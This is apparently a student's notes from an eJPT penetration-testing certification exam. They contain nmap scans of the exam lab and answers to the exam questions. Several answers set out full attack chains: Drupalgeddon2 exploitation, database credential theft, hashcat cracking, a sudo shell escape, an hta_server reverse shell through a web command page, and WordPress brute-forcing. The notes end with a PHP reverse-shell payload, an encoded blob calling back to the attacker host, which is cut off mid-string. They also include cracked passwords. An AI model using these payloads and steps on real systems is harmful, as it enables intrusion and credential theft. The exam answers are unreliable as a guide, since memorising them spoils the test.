# eJPT Final Exam Attempt 1
# Start Thu Dec 05 2024 12:33 PM
# First Break at Thus Dec 05 2024 03:08 PM  Power NAP 30 minutes
# Resume at Thus Dec 05 2024 03:39 PM
# break Thus Dec 05 2024 04:03 PM BreakFast
# Resume Thus Dec 05 2024 04:30 PM
# break Thus Dec 05 2024 08:03 PM Dinner
# Resume Thus Dec 05 2024 08:47 PM
# break Thus Dec 05 2024 11:36 PM sleep
# Resume Thus Dec 06 2024 10:00 AM
# break Thus Dec 06 2024 12:02 PM lunch
# Resume Thus Dec 06 2024 12:37 PM
# break Thus Dec 06 2024 02:30 PM mind fresh
# Resume Thus Dec 06 2024 03:00 PM
# break Thus Dec 06 2024 05:30 PM Power Nap
# Resume Thus Dec 06 2024 05:50 PM
# break Thus Dec 06 2024 08:00 PM Dinner 
# Resume Thus Dec 06 2024 08:40 PM

# 
## Nmap Scan 1 to find live ip's
```
Nmap scan report for ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1)
Host is up (0.00045s latency).
MAC Address: 02:F4:72:6E:6C:93 (Unknown)
Nmap scan report for ip-192-168-100-50.ap-south-1.compute.internal (192.168.100.50)
Host is up (0.0016s latency).
MAC Address: 02:9C:8B:E7:10:8D (Unknown)
Nmap scan report for ip-192-168-100-51.ap-south-1.compute.internal (192.168.100.51)
Host is up (0.0016s latency).
MAC Address: 02:DE:87:44:D9:9F (Unknown)
Nmap scan report for ip-192-168-100-52.ap-south-1.compute.internal (192.168.100.52)
Host is up (0.0016s latency).
MAC Address: 02:8C:03:89:63:CD (Unknown)
Nmap scan report for ip-192-168-100-55.ap-south-1.compute.internal (192.168.100.55)
Host is up (0.0015s latency).
MAC Address: 02:9F:4F:4B:34:95 (Unknown)
Nmap scan report for ip-192-168-100-63.ap-south-1.compute.internal (192.168.100.63)
Host is up (0.00040s latency).
MAC Address: 02:3A:AB:B3:BE:61 (Unknown)
Nmap scan report for ip-192-168-100-67.ap-south-1.compute.internal (192.168.100.67)
Host is up (0.00040s latency).
MAC Address: 02:77:59:A3:29:B5 (Unknown)
Nmap scan report for ip-192-168-100-5.ap-south-1.compute.internal (192.168.100.5)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 1.84 seconds
```

192.168.100.1
192.168.100.50
192.168.100.51
192.168.100.52
192.168.100.55
192.168.100.63
192.168.100.67
192.168.100.5


## nmap scan 2 for version detection of open ports of live targets
```
root@kali:~# nmap -sV -iL hosts 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-05 12:44 IST
Nmap scan report for ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1)
Host is up (0.00021s latency).
All 1000 scanned ports on ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 02:F4:72:6E:6C:93 (Unknown)

Nmap scan report for ip-192-168-100-50.ap-south-1.compute.internal (192.168.100.50)
Host is up (0.00057s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:9C:8B:E7:10:8D (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for ip-192-168-100-51.ap-south-1.compute.internal (192.168.100.51)
Host is up (0.00060s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:DE:87:44:D9:9F (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for ip-192-168-100-52.ap-south-1.compute.internal (192.168.100.52)
Host is up (0.00066s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.41
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:8C:03:89:63:CD (Unknown)
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for ip-192-168-100-55.ap-south-1.compute.internal (192.168.100.55)
Host is up (0.00086s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 02:9F:4F:4B:34:95 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for ip-192-168-100-63.ap-south-1.compute.internal (192.168.100.63)
Host is up (0.00057s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 02:3A:AB:B3:BE:61 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ip-192-168-100-67.ap-south-1.compute.internal (192.168.100.67)
Host is up (0.00066s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:77:59:A3:29:B5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for ip-192-168-100-5.ap-south-1.compute.internal (192.168.100.5)
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.7p1 Debian 2 (protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
5910/tcp open  vnc           VNC (protocol 3.8)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 8 IP addresses (8 hosts up) scanned in 101.26 seconds
root@kali:~# 
```
## Third Nmap Scan for Question 11. 
```
root@kali:~# nmap -sV -sC -iL winservers 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-05 13:28 IST
Nmap scan report for ip-192-168-100-50.ap-south-1.compute.internal (192.168.100.50)
Host is up (0.00063s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: WAMPSERVER Homepage
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2024-12-05T07:59:54+00:00
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2024-12-04T07:06:32
|_Not valid after:  2025-06-05T07:06:32
|_ssl-date: 2024-12-05T08:00:00+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:9C:8B:E7:10:8D (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-05T07:59:54+00:00
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:9c:8b:e7:10:8d (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-05T07:59:54
|_  start_date: 2024-12-05T07:06:29

Nmap scan report for ip-192-168-100-51.ap-south-1.compute.internal (192.168.100.51)
Host is up (0.00059s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       <DIR>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Thu, 05 Dec 2024 07:59:54 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/8.5
|   Directory Listing: 
|     http://ip-192-168-100-51.ap-south-1.compute.internal/
|     http://ip-192-168-100-51.ap-south-1.compute.internal/aspnet_client/
|     http://ip-192-168-100-51.ap-south-1.compute.internal/cmdasp.aspx
|     http://ip-192-168-100-51.ap-south-1.compute.internal/iis-85.png
|     http://ip-192-168-100-51.ap-south-1.compute.internal/iisstart.htm
|_    http://ip-192-168-100-51.ap-south-1.compute.internal/robots.txt.txt
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2024-12-04T07:06:33
|_Not valid after:  2025-06-05T07:06:33
|_ssl-date: 2024-12-05T08:00:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2024-12-05T07:59:54+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:DE:87:44:D9:9F (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-05T07:59:55
|_  start_date: 2024-12-05T07:06:21
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: <unknown>, NetBIOS MAC: 02:de:87:44:d9:9f (unknown)

Nmap scan report for ip-192-168-100-55.ap-south-1.compute.internal (192.168.100.55)
Host is up (0.00100s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2024-12-04T07:05:57
|_Not valid after:  2025-06-05T07:05:57
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-05T07:59:54+00:00
|_ssl-date: 2024-12-05T07:59:59+00:00; -1s from scanner time.
MAC Address: 02:9F:4F:4B:34:95 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-05T07:59:54
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-05T07:59:54+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 02:9f:4f:4b:34:95 (unknown)

Nmap scan report for ip-192-168-100-63.ap-south-1.compute.internal (192.168.100.63)
Host is up (0.00061s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EC2AMAZ-IK4QFED
| Not valid before: 2024-12-04T07:04:43
|_Not valid after:  2025-06-05T07:04:43
|_ssl-date: 2024-12-05T08:00:00+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-IK4QFED
|   NetBIOS_Domain_Name: EC2AMAZ-IK4QFED
|   NetBIOS_Computer_Name: EC2AMAZ-IK4QFED
|   DNS_Domain_Name: EC2AMAZ-IK4QFED
|   DNS_Computer_Name: EC2AMAZ-IK4QFED
|   Product_Version: 10.0.14393
|_  System_Time: 2024-12-05T07:59:55+00:00
MAC Address: 02:3A:AB:B3:BE:61 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 78.71 seconds
```
## Question and there answers:
1. What is the IP address of the host running WordPress? 
- 192.168.100.50
2. How many hosts on the DMZ network are running Windows?
- 4
3. How many hosts on the DMZ network are running a web server on port 80?
- 4
4. How many hosts on the DMZ network are running a database server?
- 1 192.168.100.52 3306
5. What Linux distribution is running on the host running the Drupal site?
- Ubuntu 192.168.100.52
6. What services does Syntex provide to companies?
- Workflow Development http://192.168.100.52/drupal/?q=node/1
7. What is the email of the admin user on the Drupal site?
- admin@syntex.com Check for the password Reset field
8. What version of Drupal is running on the Drupal site?
- 7.57 http://192.168.100.52/drupal/CHANGELOG.txt 
9. How many systems on the target network have FTP servers with anonymous access enabled?
- 2 192.168.100.151 AND 192.168.100.152
10. What is the IP address of the FTP server that contains a file called updates.txt? 
- 192.168.100.52 
```
root@kali:~# ftp 192.168.100.52
Connected to 192.168.100.52.
220 (vsFTPd 3.0.3)
Name (192.168.100.52:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
```
11. What type of vulnerability can be exploited to gain access to WINSERVER-03?
- SMB BRUTE FORCE 192.168.100.55 used Rockyou.txt password to get the access of administrator user and use psexec module to take shell

12. What type of vulnerability can be exploited to elevate your privileges on the Linux host running Drupal?
- Misconfigured SUDO Permissions. First drupal version is 7.57 which is vulnerable to CVE-2018-7600  and this can be exploited with Drupalgeddon2 this module of metasploit after exploitation we get the www-data user access we move and search for the file that holds the configuration for drupal 'cat /var/www/html/drupal/sites/default/settings.php' and then we find out the mysql username and password in it we can use this mysql id and password to login and see the databases in the same session 'mysql -u drupal -h localhost --password='drupal0421' -e 'show databases; | use drupal; select * from users;'' copy the hash for the auditor user then crack it with hash cat 'hashcat hash /usr/share/wordlists/rockyou.txt -m 7900'. you will get the user password 'qwertyuiop' then use this id 'auditor' and password 'qwertyuiop' and login 'su auditor' after that use 'sudo -l' and search for the 'gtfboins for find command with SUID' and this as a sudo 'sudo find . -exec /bin/sh \; -quit' and boom.

13. Which one of the following MSF modules can be used to obtain an elevated reverse shell on WINSERVER-02?
- 192.168.100.51 exploit/windows/misc/hta_server start the server then use certutil to get the .hta file hosted on local hosts then run it in finded *http://192.168.100.51/cmdasp.aspx* commond execution field .\myhta.hta and boom you got the eleveated shell.

14. How many hosts exist within the internal network that cannot be accessed through the DMZ network?
- 5 run in a meterpreter session arp_scanner -r 192.168.89.0/24

15. What is the subnet of the internal network?
- 192.168.0.0/24

16. What host can be used to pivot into the internal network?
- WINSERVER-03 we are able to view the internal network with ipconfig on this server thats why

17. What is the password of the user account "dbadmin" on the Linux server hosting Drupal?
- sayang to see how i take access to this machine take look at the answer of the question 32

18. What is the password for the user "mike" on WINSERVER-01?
-     to start the network first we need to add the '192.168.100.50 wordpress.local' to the '/etc/hosts' so we can access this site after that explotre the site scan with the 'wp-scan' tool you will get the 'xmlrpc.php' file that can be bruteforce with the site exploration we know the username is 'admin' and we can bruteforce this one with the 'xmlrpc' metasploit login module for wordpress using 'rockyou.txt' and we got the password 'estrella'. after that login to the panel then go to the plugin section take a one plugin php file and upadate it with a Revershell payload here i have used.
```
header('Content-type: text/plain');
$ip   = "192.168.100.5"; //change this 
$port = "1234"; //change this
$payload = "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